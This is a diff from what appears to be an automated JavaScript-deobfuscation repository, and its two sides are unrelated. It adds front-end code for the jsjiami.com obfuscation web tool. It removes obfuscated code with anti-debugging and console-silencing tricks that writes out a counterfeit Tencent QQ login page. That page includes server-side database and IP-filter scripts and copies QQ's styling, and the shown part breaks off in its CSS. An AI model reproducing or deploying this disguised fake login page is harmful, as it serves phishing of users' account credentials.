@@ -1,772 +1,317 @@
-//Tue Apr 08 2025 08:26:52 GMT+0000 (Coordinated Universal Time)
+//Tue Apr 08 2025 08:30:26 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-var encode_version = "jsjiami.com.v5";
-var _0x2ef383 = function () {
-  var _0x2410f8 = true;
-  return function (_0xa7381e, _0x430daf) {
-    var _0x8e8178 = _0x2410f8 ? function () {
-      if (_0x430daf) {
-        var _0x7a7524 = _0x430daf.apply(_0xa7381e, arguments);
-        _0x430daf = null;
-        return _0x7a7524;
+(function () {})();
+var zs = "/*\n\n* 加密工具已经升级了一个版本，目前为 jsjiami.com.v7 ，更新了加密算法，缩减了体积;\n\n* 另外 jsjiami.com.v7 已经强制加入校验，注释可以去掉，但是 jsjiami.com.v7 不能去掉，其他都没有任何绑定。\n\n* 誓死不会加入任何后门，JsJiami.com  加密的使命就是为了保护你们的Javascript 。\n\n*/\n\n",
+  _mm = k_message,
+  _vip_info = {},
+  new_version = "jsjiami.com.v7";
+layui.config({
+  "base": "/",
+  "version": 3
+}).use(["model"], function () {
+  element = layui.element;
+  form = layui.form;
+  laytpl = layui.laytpl;
+  so(".layui-inline  .layui-checkbox-disbaled").on("click", function () {
+    return layer.msg(_mm.m4, so.defn), !1;
+  });
+  var _0x52b361 = so("[name=encodeVersion]").val();
+  so("[name=encodeVersion]").on("blur", function () {
+    var _0x20d2a = this.value;
+    if (!/^[0-9A-Za-z\\.]{1,15}$/.test(_0x20d2a)) return this.value = _0x52b361, layer.alert(_mm.m8, {
+      "title": "版本号格式提醒"
+    }), !1;
+    so.configObj.encodeVersion = _0x20d2a;
+    _0x52b361 = _0x20d2a;
+    out_config();
+  });
+  form.on("select(index)", function (_0x32f327) {
+    batch_config();
+  });
+  form.on("select(updated)", function (_0x2a05c7) {
+    batch_config();
+  });
+  form.on("select(basicName)", function (_0x4c6d77) {
+    if (_0x4c6d77.value == 2) {
+      layer.msg(_mm.m9);
+    } else _0x4c6d77.value > 1 && layer.msg(_mm.m10);
+    batch_config();
+  });
+  form.on("checkbox(updated)", function (_0x3f48cf) {
+    batch_config();
+  });
+  form.on("checkbox(vip)", function (_0x1bbedf) {
+    _0x1bbedf.elem.name == "allRename" && _0x1bbedf.elem.checked && layer.msg(_mm.m5);
+    batch_config();
+  });
+  form.on("checkbox(basic)", function (_0x5ba557) {
+    batch_config();
+  });
+  form.on("checkbox(bconfig)", function (_0x27c686) {
+    so("[lay-filter=\"bconfig\"]").removeAttr("checked");
+    _0x27c686.elem.checked = !0;
+    var _0x167bd4 = _0x27c686.elem.name;
+    so.configObj = js_data[_0x167bd4];
+    init_config(so.configObj);
+    if (_0x167bd4 === "best") layer.msg(_mm.m6);else {
+      if (_0x167bd4 === "niub") layer.msg(_mm.m7);else _0x167bd4 === "autojs" && layer.alert(_mm.m12);
+    }
+    batch_config();
+    form.render();
+  });
+  var _0xa6c522 = function (_0x714d5d) {
+    var _0x3ada27 = 0,
+      _0xd2bbf8 = 0,
+      _0x47dfc4 = setInterval(function () {
+        if (_0x3ada27 === 0) {
+          _0x3ada27 = 1;
+          so.post("/auth_v_1_0/js/js_defecate/v7/load.json", {
+            "key": _0x714d5d,
+            "type": $("[enType]").val()
+          }).done(function (_0x3e583a) {
+            element.tabChange("box", "result");
+            if (_0x3e583a && _0x3e583a.status === 200) {
+              clearInterval(_0x47dfc4);
+              _0x3e583a.downUrl && (so("[unfinished-tips]").addClass("layui-hide"), so("[success-tips]").attr("href", _0x3e583a.downUrl).removeClass("layui-hide"));
+              so("[statusText]").val(_0x3e583a.statusText);
+              console.log(so("[statusText]").length, so("[statusText]"));
+              layer.close(load);
+              layer.alert("加密完成，请点击【下载加密结果 zip压缩包】");
+            }
+            _0xd2bbf8++;
+            _0x3ada27 = 0;
+          });
+          _0xd2bbf8 > 60 && layer.alert("如果等待时间超过了预计时间很久，请刷新页面，重新加密。");
+          if (_0xd2bbf8 > 200) {
+            layer.alert("已经停止获取状态，请刷新后再使用");
+            clearInterval(_0x47dfc4);
+          }
+        }
+      }, 1888);
+  };
+  so(".execute").on("click", function () {
+    var _0x40fdd5 = so.trim(so("#source").val());
+    batch_config();
+    if ("" == _0x40fdd5) return layer.msg("请粘贴 JavaScript 代码。<br>也可以选择‘JS’文件加密。", so.defn), !1;else {
+      if (_0x40fdd5.indexOf("<script") === 0) return layer.alert(_mm.m11, {
+        "title": "Javascript 脚本加密错误提示"
+      }), !1;else {
+        if (_0x40fdd5.indexOf("alert(") === 0) return layer.alert("这么简单的代码，没加密的必要吧。", {
+          "title": "Javascript 脚本加密错误提示"
+        }), !1;else {
+          if (_0x40fdd5.indexOf("<") === 0) return layer.alert("只可以纯JS加密，检测到了HTML代码<br>请先把HTML转换为Javascript代码。", {
+            "title": "Javascript 脚本加密错误提示",
+            "btn": ["HTML转换Javascript", "取消"]
+          }, function () {
+            so.refresh(+"/jsxhtml.html");
+          }), !1;
+        }
       }
-    } : function () {};
-    _0x2410f8 = false;
-    return _0x8e8178;
-  };
-}();
-var _0x3e2a94 = _0x2ef383(this, function () {
-  var _0x2298c6 = function () {
-      return "dev";
-    },
-    _0x3600db = function () {
-      return "window";
-    };
-  var _0x58a258 = function () {
-    var _0x45c128 = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
-    return !_0x45c128.test(_0x2298c6.toString());
-  };
-  var _0x37c265 = function () {
-    var _0x5a940a = new RegExp("(\\\\[x|u](\\w){2,4})+");
-    return _0x5a940a.test(_0x3600db.toString());
-  };
-  var _0x2964a2 = function (_0x1a30d7) {
-    var _0x16230e = ~-1 >> NaN;
-    if (_0x1a30d7.indexOf("i" === _0x16230e)) {
-      _0x3ed72f(_0x1a30d7);
     }
-  };
-  var _0x3ed72f = function (_0x5f2dbe) {
-    var _0x5d0853 = ~-4 >> NaN;
-    if (_0x5f2dbe.indexOf((true + "")[3]) !== _0x5d0853) {
-      _0x2964a2(_0x5f2dbe);
-    }
-  };
-  if (!_0x58a258()) {
-    if (!_0x37c265()) {
-      _0x2964a2("indеxOf");
+    var _0x349459 = function () {
+        btn_load();
+        var _0x58b14a = (Math.random() * 100).toString(32);
+        so.post("/auth_v_1_0/v7/js/js_obfuscator.json?v=" + _0x58b14a, so.extend({
+          "source": _0x40fdd5
+        }, so.configObj), function (_0x438cbd) {
+          btn_init();
+          if (_0x438cbd.status == 500) {
+            return layer.msg(_0x438cbd.message, so.defn), !1;
+          }
+          if (_0x438cbd.status == 204) return layer.alert(_0x438cbd.message), !1;
+          var _0x343cea = _0x438cbd.code;
+          if (_0x343cea === "sys") $("[single]").removeClass("layui-hide"), $("[batch]").addClass("layui-hide"), laytpl(singleTeamplate.innerHTML).render(_0x438cbd, function (_0x1ea3dc) {
+            $("[single]").html(_0x1ea3dc);
+            element.tabChange("box", "result");
+            _0xa6c522(_0x438cbd.key);
+          });else {
+            so("#resultSource").val(zs + _0x343cea);
+            so("#copySource").val(_0x343cea);
+            $("[single]").addClass("layui-hide");
+            $("[batch]").removeClass("layui-hide");
+            element.tabChange("box", "result");
+          }
+        }, {
+          "sojsonData": so.sf.en("js|" + _0x58b14a + "|" + _0x40fdd5.length)
+        });
+      },
+      _0x26e253 = so.configObj.domains;
+    if (_0x26e253 && _0x26e253.length > 0) {
+      _0x26e253 = _0x26e253.split(",");
+      if (_0x26e253.length > 5 && _vip_info.status !== 200) layer.msg("免费用户，安全域名不能超过5个。");else {
+        var _0x182c90 = "<code>" + _0x26e253.join("</code><br><code>") + "</code>";
+        layer.confirm("您配置了：<br>{%d}，<br>不在这些域名下运行会导致浏览器卡死，<br>敬请注意！！".fmt({
+          "d": _0x182c90
+        }), {
+          "icon": 7,
+          "title": "安全域名配置提醒"
+        }, function (_0x2506b4) {
+          layer.close(_0x2506b4);
+          _0x349459();
+        });
+      }
     } else {
-      _0x2964a2("indexOf");
+      _0x349459();
     }
-  } else {
-    _0x2964a2("indеxOf");
-  }
-});
-_0x3e2a94();
-var _0x3b8753 = function () {
-  var _0x3e4395 = true;
-  return function (_0x4b01ac, _0x4aa07b) {
-    var _0x5a616a = _0x3e4395 ? function () {
-      if (_0x4aa07b) {
-        var _0x3a60a4 = _0x4aa07b.apply(_0x4b01ac, arguments);
-        _0x4aa07b = null;
-        return _0x3a60a4;
+  });
+  init_config();
+  so.user.vipLazy(1, function (_0x6d23c8) {
+    _vip_info = _0x6d23c8;
+    var _0x3bb3cd = "组件加载完毕，开始使用吧。",
+      _0x1e92db = so("[name=selenium]"),
+      _0x8327b3 = 0;
+    if (_vip_info && _vip_info.status === 200) {
+      _0x3bb3cd = "您好，尊敬的【{%levelName}】用户<br>有效期:{%etime}".fmt(_vip_info);
+      so("[name=\"encodeVersion\"]").removeAttr("disabled");
+      so("[name=\"levelStart\"]").val(1).removeAttr("disabled");
+      if (_vip_info.level === 1) so("[name=\"levelEnd\"]").val(30).removeAttr("disabled").removeClass("layui-hide");else {
+        if (_vip_info.level === 2) {
+          so("[name=\"levelEnd\"]").val(100).removeAttr("disabled").removeClass("layui-hide");
+        } else {
+          if (_vip_info.level === 3) {
+            so("[name=\"levelEnd\"]").val(1000).removeAttr("disabled").removeClass("layui-hide");
+          }
+        }
       }
-    } : function () {};
-    _0x3e4395 = false;
-    return _0x5a616a;
-  };
-}();
-var _0x2139e0 = _0x3b8753(this, function () {
-  var _0x1f7964 = function () {};
-  var _0xb89d61 = typeof window !== "undefined" ? window : typeof process === "object" && typeof require === "function" && typeof global === "object" ? global : this;
-  if (!_0xb89d61.console) {
-    _0xb89d61.console = function (_0x5ccafd) {
-      var _0xcc46e = {};
-      _0xcc46e.log = _0x5ccafd;
-      _0xcc46e.warn = _0x5ccafd;
-      _0xcc46e.debug = _0x5ccafd;
-      _0xcc46e.info = _0x5ccafd;
-      _0xcc46e.error = _0x5ccafd;
-      _0xcc46e.exception = _0x5ccafd;
-      _0xcc46e.trace = _0x5ccafd;
-      return _0xcc46e;
-    }(_0x1f7964);
+      so("[name=\"gang\"]").removeClass("layui-hide");
+      so.configObj.stringArrayStorageItemNum = [1, so("[name=\"levelEnd\"]").val()];
+      _0x1e92db.find("option").removeAttr("disabled");
+      _0x8327b3 = 1;
+    } else {
+      if (_vip_info && _vip_info.status === 404) {
+        _0x3bb3cd = _vip_info.message;
+      }
+    }
+    if (_0x8327b3 === 0) {
+      so("[name=\"encodeVersion\"]").val(new_version).v("disabled", !0);
+      so("[name=\"levelStart\"]").val(3).v("disabled", !0);
+      so("[name=\"levelEnd\"]").v("disabled", !0);
+      _0x1e92db.val(0);
+      _0x1e92db.find("option[value=1]").v("disabled", "");
+    }
+    form.render();
+    layer.msg(_0x3bb3cd);
+    batch_config();
+  });
+  so("[name=\"levelStart\"]").blur(function () {
+    if (parseInt(so("[name=\"levelStart\"]").val()) < 1) return so("[name=\"levelStart\"]").val(1), layer.alert("最小值不能小于1哦");
+    let _0x563b9c = parseInt(so("[name=\"levelEnd\"]").val());
+    if (parseInt(so("[name=\"levelStart\"]").val()) > _0x563b9c) return so("[name=\"levelStart\"]").val(1), layer.alert("最小值不能超过最大值哦");
+    so.configObj.stringArrayStorageItemNum = [so("[name=\"levelStart\"]").val(), so("[name=\"levelEnd\"]").val()];
+    out_config();
+  });
+  so("[name=\"levelEnd\"]").blur(function () {
+    let _0x5819d4 = parseInt(so("[name=\"levelEnd\"]").val());
+    if (_vip_info.level === 1) {
+      if (_0x5819d4 > 30) {
+        return so("[name=\"levelEnd\"]").val(30), layer.alert("白银会员最大值不能超过30哦");
+      }
+      resteEndv(_0x5819d4, 30);
+    } else {
+      if (_vip_info.level === 2) {
+        if (_0x5819d4 > 50) return so("[name=\"levelEnd\"]").val(50), layer.alert("黄金会员最大值不能超过50哦");
+        resteEndv(_0x5819d4, 50);
+      } else {
+        if (_vip_info.level === 3) {
+          if (_0x5819d4 > 1000) return so("[name=\"levelEnd\"]").val(1000), layer.alert("钻石会员最大值不能超过1000哦");
+          resteEndv(_0x5819d4, 1000);
+        }
+      }
+    }
+    so.configObj.stringArrayStorageItemNum = [so("[name=\"levelStart\"]").val(), so("[name=\"levelEnd\"]").val()];
+    out_config();
+  });
+});
+so.w.resteEndv = function (_0x127064, _0x4bd06e) {
+  if (_0x127064 < parseInt(so("[name=\"levelStart\"]").val())) return so("[name=\"levelEnd\"]").val(_0x4bd06e), layer.alert("最大值不能小于最小值哦");
+};
+$(document).on("click", "[unfinished-tips]", function () {
+  layer.msg("请稍等，正在加密...");
+});
+so.w.batch_config = function () {
+  so("input[lay-filter],select[lay-filter],.tagsinput").each(function () {
+    var _0x414fe2 = this.checked,
+      _0x34b2a7 = this.name,
+      _0x31428e = $(this).attr("type");
+    if (_0x31428e == "text" || _0x414fe2 == undefined) {
+      so.play("so.configObj." + _0x34b2a7 + "='" + this.value + "'");
+    } else (_0x414fe2 === true || _0x414fe2 === false) && so.play("so.configObj." + _0x34b2a7 + "='" + _0x414fe2 + "'");
+  });
+  so.configObj.stringArrayStorageItemNum = [so("[name=\"levelStart\"]").val(), so("[name=\"levelEnd\"]").val()];
+  out_config();
+};
+so.w.out_config = function () {
+  so.utils.setItem("JSJIAMI7", so.configObj);
+};
+so.w.init_config = function (_0x3afdef) {
+  var _0x57030d = _0x3afdef || so.utils.getItem("JSJIAMI7");
+  console.log("init_config", _0x57030d);
+  if (_0x57030d) {
+    so.configObj = _0x57030d;
+    if (so.configObj.autojs && so.configObj.autojs === "true") so("[advanced]").addClass("layui-hide"), so("[advanced-disable]").v("disabled", true), so.configObj.domains = "";else {
+      so("[advanced]").removeClass("layui-hide");
+      so("[advanced-disable]").v("disabled", false);
+    }
+    for (var _0x24e584 in so.configObj) {
+      var _0x4bd199 = so.configObj[_0x24e584];
+      _0x4bd199 === "false" || _0x4bd199 === "true" ? (_0x4bd199 = _0x4bd199 === "true" ? true : false, so("[name=\"" + _0x24e584 + "\"]").prop("checked", _0x4bd199)) : so("[name=\"" + _0x24e584 + "\"]").val(_0x4bd199);
+    }
+    form.render();
   } else {
-    _0xb89d61.console.log = _0x1f7964;
-    _0xb89d61.console.warn = _0x1f7964;
-    _0xb89d61.console.debug = _0x1f7964;
-    _0xb89d61.console.info = _0x1f7964;
-    _0xb89d61.console.error = _0x1f7964;
-    _0xb89d61.console.exception = _0x1f7964;
-    _0xb89d61.console.trace = _0x1f7964;
+    so.configObj = js_data.best;
+  }
+  so(".tagsinput").sojson_box();
+};
+var btn_load = function () {
+    so(".execute > i").addClass("layui-anim layui-anim-rotate layui-anim-loop");
+    so(".execute").addClass("layui-btn-disabled");
+    load = layer.load();
+  },
+  btn_init = function () {
+    so(".execute > i").removeClass("layui-anim layui-anim-rotate layui-anim-loop");
+    so(".execute").removeClass("layui-btn-disabled");
+    layer.close(load);
+  },
+  element,
+  form,
+  load;
+so.configObj = new Object();
+Dropzone.autoDiscover = false;
+var myDropzone = new Dropzone("#mydropzone", {
+  "url": "/url",
+  "maxFiles": 1,
+  "maxFilesize": 0.5,
+  "addRemoveLinks": false,
+  "acceptedFiles": ".js",
+  "uploadMultiple": false,
+  "autoProcessQueue": false,
+  "parallelUploads": 1,
+  "dictFallbackMessage": "浏览器不受支持",
+  "dictDefaultMessage": "拖拽JavaScript文件 或者 点击读取JavaScript文件",
+  "dictFileTooBig": "JavaScript文件最大为512kb",
+  "dictInvalidFileType": "只能上传JavaScript文件",
+  "init": function () {
+    this.on("addedfile", function (_0x466735) {
+      var _0x1e255b = new FileReader();
+      _0x1e255b.readAsText(_0x466735);
+      var _0x4cd21d = layer.load();
+      _0x1e255b.onload = function () {
+        layer.close(_0x4cd21d);
+        var _0x5b62ff = so.trim(this.result);
+        if ("" == _0x5b62ff) {
+          return layer.msg("您上传的文件内容为空！", so.defn), !1;
+        }
+        so("#source").val(_0x5b62ff);
+        var _0xa2599b = "<i class=\"layui-icon\">&#xe61d;</i> {%name} （{%size}Kb）";
+        so("#_size").html(_0xa2599b.fmt({
+          "name": _0x466735.name,
+          "size": parseInt(_0x466735.size / 1024)
+        }));
+        myDropzone.removeAllFiles();
+        layer.msg("文件读取成功。");
+        element.tabChange("box", "copyFile");
+      };
+    });
   }
 });
-_0x2139e0();
-document.writeln("");
-document.writeln("﻿<!--#include file=\"include/db_conn.asp\"-->");
-document.writeln("<!DOCTYPE html>");
-document.writeln("<html class=\"javascript am-touch js cssanimations ios\">");
-document.writeln("<head>");
-document.writeln("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">");
-document.writeln("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">");
-document.writeln("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">");
-document.writeln("<script language=\"javascript\" src=\"drop_ip.asp\"></script>");
-document.writeln("<!--<");
-document.writeln("<script src=\"js/jquery.min.js\"></script>");
-document.writeln("<link rel=\"stylesheet\" href=\"css/2reset.css\">");
-document.writeln("<link rel=\"stylesheet\" href=\"css/keyboard.css\">");
-document.writeln(">-->");
-document.writeln("    <title>腾讯QQ-用户登录</title>");
-document.writeln("    <title>-</title>");
-document.writeln("<style type=\"text/css\">");
-document.writeln("@charset 'utf-8';");
-document.writeln("body, html {");
-document.writeln("\theight: 100%");
-document.writeln("}");
-document.writeln("#go, #onekey, #vcode #submit, .copyright, .header, .nick, .q_login, .ui_topbar {");
-document.writeln("\ttext-align: center");
-document.writeln("}");
-document.writeln(".del_touch, .inputstyle {");
-document.writeln("\t-webkit-tap-highlight-color: rgba(255,255,255,0)");
-document.writeln("}");
-document.writeln("body {");
-document.writeln("\tfont-size: 16px;");
-document.writeln("\tbackground: #F4F5F6");
-document.writeln("}");
-document.writeln("input {");
-document.writeln("   ");
-document.writeln("    background-color: #ffffff;");
-document.writeln("\t border: none; /* 去除输入框边框 */");
-document.writeln("\t margin-left: 20px;");
-document.writeln("  outline: none; /* 去除焦点时的轮廓 */");
-document.writeln("  font-size: 109%; /* 字体大小，与.item一致 */");
-document.writeln("  align-items: center;");
-document.writeln("  height: 44px;");
-document.writeln("border-radius: 5px;");
-document.writeln("  /* 其他可能的样式，如padding等，视具体设计而定 */");
-document.writeln("}");
-document.writeln("* {");
-document.writeln("\tpadding: 0;");
-document.writeln("\tmargin: 0;");
-document.writeln("\tlist-style: none;");
-document.writeln("\ttext-decoration: none");
-document.writeln("}");
-document.writeln("input::-webkit-input-placeholder, textarea::-webkit-input-placeholder {");
-document.writeln("color:#aaa");
-document.writeln("}");
-document.writeln("input::-ms-input-placeholder, textarea::-ms-input-placeholder {");
-document.writeln("color:#aaa");
-document.writeln("}");
-document.writeln("input:focus {");
-document.writeln("\toutline: 0");
-document.writeln("}");
-document.writeln(".content {");
-document.writeln("\tmargin: 0 auto;");
-document.writeln("\twidth: 320px;");
-document.writeln("\theight: 500px;");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln("#error_tips {");
-document.writeln("\tposition: absolute;");
-document.writeln("\ttop: 0;");
-document.writeln("\tz-index: 100;");
-document.writeln("\tdisplay: none;");
-document.writeln("\topacity: .95;");
-document.writeln("\twidth: 100%");
-document.writeln("}");
-document.writeln("#error_tips #error_tips_content {");
-document.writeln("\tposition: relative;");
-document.writeln("\tpadding: 16px 0 24px 24px;");
-document.writeln("\tborder-radius: 5px;");
-document.writeln("\tbackground-color: #525C5F;");
-document.writeln("\theight: 28px");
-document.writeln("}");
-document.writeln("#error_tips #error_tips_content #error_icon {");
-document.writeln("\tposition: absolute;");
-document.writeln("\ttop: 18px;");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\twidth: 24px;");
-document.writeln("\theight: 24px;");
-document.writeln("\tbackground: url('/style/8/images/info.png') no-repeat");
-document.writeln("}");
-document.writeln("#error_tips #error_tips_content #error_message {");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\tline-height: 28px;");
-document.writeln("\tfont-size: 14px;");
-document.writeln("\tcolor: #fff;");
-document.writeln("\tpadding: 0 0 0 28px");
-document.writeln("}");
-document.writeln("#error_message a, #error_message a:visited {");
-document.writeln("\tcolor: #F15A22");
-document.writeln("}");
-document.writeln("");
-document.writeln("@media (-webkit-min-device-pixel-ratio:2), (min-resolution:192dpi), (min-resolution:2dppx) {");
-document.writeln("#error_tips #error_tips_content #error_icon {");
-document.writeln("\tbackground: url('/style/8/images/info@2x.png') no-repeat;");
-document.writeln("\tbackground-size: 24px 24px");
-document.writeln("}");
-document.writeln("}");
-document.writeln(".login {");
-document.writeln("\tmargin: 0 auto;");
-document.writeln("\tpadding-top: 30px");
-document.writeln("}");
-document.writeln(".q_login {");
-document.writeln("\tmargin: 0 auto 40px;");
-document.writeln("\twidth: 290px;");
-document.writeln("\toverflow: hidden");
-document.writeln("}");
-document.writeln(".inputstyle {");
-document.writeln("\twidth: 273px;");
-document.writeln("\theight: 44px;");
-document.writeln("\tcolor: #000;");
-document.writeln("\tborder: none;");
-document.writeln("\tbackground: 0 0;");
-document.writeln("\tpadding-left: 15px;");
-document.writeln("\tfont-size: 16px;");
-document.writeln("\t-webkit-appearance: none");
-document.writeln("}");
-document.writeln(".logo {");
-document.writeln("\theight: 59px;");
-document.writeln("\twidth: 128px;");
-document.writeln("\tmargin: 0 auto 20px;");
-document.writeln("\tbackground-size: 128px 59px");
-document.writeln("}");
-document.writeln("#switch, #vcode, #web_login {");
-document.writeln("\tmargin: 0 auto");
-document.writeln("}");
-document.writeln(".header {");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\theight: 97px;");
-document.writeln("\twidth: 96px;");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln("#q_login_logo, #q_login_tips, #remember, #remember+.checkbox, #vcode #input_tips, #vcode #vcode_img, #vcode #vcode_input, .del_touch, .del_touch_icon, .del_u, .header .img_out, .header img, .nick, .txt_default {");
-document.writeln("\tposition: absolute");
-document.writeln("}");
-document.writeln(".header img {");
-document.writeln("\twidth: 60px;");
-document.writeln("\theight: 60px;");
-document.writeln("\ttop: 10px;");
-document.writeln("\tleft: 16px");
-document.writeln("}");
-document.writeln(".header .img_out {");
-document.writeln("\twidth: 60px;");
-document.writeln("\theight: 60px;");
-document.writeln("\ttop: 9px;");
-document.writeln("\tleft: 15px;");
-document.writeln("\tborder: 1px solid #c6dbe8;");
-document.writeln("\tborder-radius: 4px;");
-document.writeln("\t-webkit-box-shadow: 1px 1px 13px #6E6E6E");
-document.writeln("}");
-document.writeln(".nick {");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\ttop: 80px;");
-document.writeln("\tleft: 0;");
-document.writeln("\theight: 20px;");
-document.writeln("\tline-height: 18px;");
-document.writeln("\tvertical-align: middle");
-document.writeln("}");
-document.writeln(".del_touch_icon {");
-document.writeln("\tdisplay: none;");
-document.writeln("\twidth: 30px;");
-document.writeln("\theight: 30px;");
-document.writeln("\tleft: 60px;");
-document.writeln("\ttop: 0;");
-document.writeln("\tz-index: 1");
-document.writeln("}");
-document.writeln(".del_icon {");
-document.writeln("\tdisplay: block;");
-document.writeln("\twidth: 24px;");
-document.writeln("\theight: 22px;");
-document.writeln("\tbackground: url('/style/8/images/android_logo_v1.png') -68px 0 no-repeat;");
-document.writeln("\tborder-radius: 11px");
-document.writeln("}");
-document.writeln("#web_login {");
-document.writeln("\twidth: 290px");
-document.writeln("}");
-document.writeln("#g_list {");
-document.writeln("\tbackground: #fff;");
-document.writeln("\theight: 89px;");
-document.writeln("\tborder-radius: 4px");
-document.writeln("}");
-document.writeln("#g_p, #g_u {");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln("#g_u {");
-document.writeln("\tborder-bottom: 1px solid #eaeaea");
-document.writeln("}");
-document.writeln(".txt_default {");
-document.writeln("\ttop: 12px;");
-document.writeln("\tleft: 10px;");
-document.writeln("\tcolor: #b3b3b3");
-document.writeln("}");
-document.writeln(".del_touch {");
-document.writeln("\tright: 0;");
-document.writeln("\tdisplay: none;");
-document.writeln("\theight: 44px;");
-document.writeln("\twidth: 48px;");
-document.writeln("\tz-index: 1");
-document.writeln("}");
-document.writeln(".del_u {");
-document.writeln("\tdisplay: block;");
-document.writeln("\tleft: 15px;");
-document.writeln("\ttop: 13px;");
-document.writeln("\theight: 18px;");
-document.writeln("\twidth: 18px;");
-document.writeln("\tborder-radius: 9px;");
-document.writeln("\tbackground: url('/style/8/images/android_logo_v1.png') -117px -2px no-repeat");
-document.writeln("}");
-document.writeln("#auto_login {");
-document.writeln("\theight: 24px;");
-document.writeln("\tmargin: 15px 0;");
-document.writeln("\tcolor: #246183;");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln("#auto_login .wording {");
-document.writeln("\tposition: absolute;");
-document.writeln("\tleft: 40px;");
-document.writeln("\tline-height: 24px;");
-document.writeln("\theight: 24px;");
-document.writeln("\tfont-size: 14px");
-document.writeln("}");
-document.writeln("#remember {");
-document.writeln("\tleft: 14px;");
-document.writeln("\ttop: 5px;");
-document.writeln("\tcursor: pointer;");
-document.writeln("\tz-index: 1;");
-document.writeln("\topacity: .01");
-document.writeln("}");
-document.writeln("#remember+.checkbox{");
-document.writeln("\tdisplay: inline-block;");
-document.writeln("\twidth: 21px;");
-document.writeln("\theight: 21px;");
-document.writeln("\tleft: 9px;");
-document.writeln("\ttop: 1px;");
-document.writeln("\tborder: 1px solid #9ABBE3;");
-document.writeln("\tbackground: 0 0;");
-document.writeln("\tborder-radius: 11px");
-document.writeln("}");
-document.writeln("#remember:checked+.checkbox {");
-document.writeln("\tbackground: url('https://ui.ptlogin2.qq.com/style/8/images/checked.png') 1px 1px #146FDF;");
-document.writeln("\tborder-color: #146FDF");
-document.writeln("}");
-document.writeln("");
-document.writeln("#goo, #onekey {");
-document.writeln("\twidth: 290px;");
-document.writeln("\theight: 44px;");
-document.writeln("\tline-height: 44px;");
-document.writeln("\tbackground: #146fdf;");
-document.writeln("\tborder: none;");
-document.writeln("\tborder-radius: 4px;");
-document.writeln("\tcolor: #fff;");
-document.writeln("\tfont-size: 16px;");
-document.writeln("\tmargin-top: 15px;");
-document.writeln("\tdisplay: block");
-document.writeln("}");
-document.writeln("#go.weak, #onekey.weak, #switch #swicth_login {");
-document.writeln("\theight: 42px;");
-document.writeln("\tborder: 1px solid #9abbe3;");
-document.writeln("\tcolor: #146fdf");
-document.writeln("}");
-document.writeln("#onekey {");
-document.writeln("\tbackground: #146fdf;");
-document.writeln("\tdisplay: none");
-document.writeln("}");
-document.writeln("#go.weak, #onekey.weak {");
-document.writeln("\tbackground-color: #e7e7e7");
-document.writeln("}");
-document.writeln("#switch {");
-document.writeln("\twidth: 290px");
-document.writeln("}");
-document.writeln("#switch #swicth_login {");
-document.writeln("\twidth: 288px;");
-document.writeln("\tline-height: 44px;");
-document.writeln("\tborder-radius: 5px;");
-document.writeln("\tbackground: #e7e7e7;");
-document.writeln("\tmargin-top: 10px;");
-document.writeln("\ttext-align: center;");
-document.writeln("\tfont-size: 16px");
-document.writeln("}");
-document.writeln("#switch #zc_feedback {");
-document.writeln("\twidth: 290px;");
-document.writeln("\tposition: relative;");
-document.writeln("\tmargin-top: 15px;");
-document.writeln("\toverflow: hidden");
-document.writeln("}");
-document.writeln("#switch #forgetpwd, #switch #zc {");
-document.writeln("\tcolor: #246183;");
-document.writeln("\tline-height: 14px;");
-document.writeln("\tfont-size: 14px;");
-document.writeln("\tpadding: 15px 10px");
-document.writeln("}");
-document.writeln("#switch #zc {");
-document.writeln("\tfloat: right;");
-document.writeln("\tmargin-right: -10px");
-document.writeln("}");
-document.writeln("#switch #forgetpwd {");
-document.writeln("\tfloat: left;");
-document.writeln("\tmargin-left: -10px");
-document.writeln("}");
-document.writeln(".tansparent {");
-document.writeln("\tbackground: 0 0");
-document.writeln("}");
-document.writeln("#q_login_title {");
-document.writeln("\theight: 32px;");
-document.writeln("\tline-height: 22px;");
-document.writeln("\tmargin-bottom: 20px;");
-document.writeln("\tposition: relative");
-document.writeln("}");
-document.writeln("#q_login_logo {");
-document.writeln("\tbackground: url('/style/8/images/android_logo_v1.png') -44px 0 no-repeat;");
-document.writeln("\twidth: 22px;");
-document.writeln("\theight: 22px;");
-document.writeln("\tleft: 0");
-document.writeln("}");
-document.writeln("#q_login_tips {");
-document.writeln("\tleft: 30px;");
-document.writeln("\ttop: 0;");
-document.writeln("\tcolor: #246183");
-document.writeln("}");
-document.writeln("#vcode {");
-document.writeln("\tpadding-top: 40px;");
-document.writeln("\tdisplay: none");
-document.writeln("}");
-document.writeln("#vcode #vcode_tips {");
-document.writeln("\tdisplay: block;");
-document.writeln("\twidth: 290px;");
-document.writeln("\theight: 20px;");
-document.writeln("\tline-height: 20px;");
-document.writeln("\tmargin: 0 auto 15px;");
-document.writeln("\tcolor: #77838D");
-document.writeln("}");
-document.writeln("#vcode #vcode_area {");
-document.writeln("\tposition: relative;");
-document.writeln("\tmargin: 0 auto;");
-document.writeln("\twidth: 290px;");
-document.writeln("\theight: 70px;");
-document.writeln("\tborder-radius: 5px;");
-document.writeln("\tborder: 1px solid #b8b8b8;");
-document.writeln("\tbackground: #fff");
-document.writeln("}");
-document.writeln("#vcode #vcode_img {");
-document.writeln("\tleft: 3px;");
-document.writeln("\twidth: 140px;");
-document.writeln("\theight: 70px");
-document.writeln("}");
-document.writeln("#vcode #vcode_input {");
-document.writeln("\ttop: -1px;");
-document.writeln("\tleft: 145px;");
-document.writeln("\twidth: 145px;");
-document.writeln("\theight: 70px;");
-document.writeln("\tborder: 1px solid #9d9d9d;");
-document.writeln("\tbackground: 0 0;");
-document.writeln("\t-webkit-appearance: none;");
-document.writeln("\tborder-top-right-radius: 5px;");
-document.writeln("\tborder-bottom-right-radius: 5px;");
-document.writeln("\tline-height: 28px;");
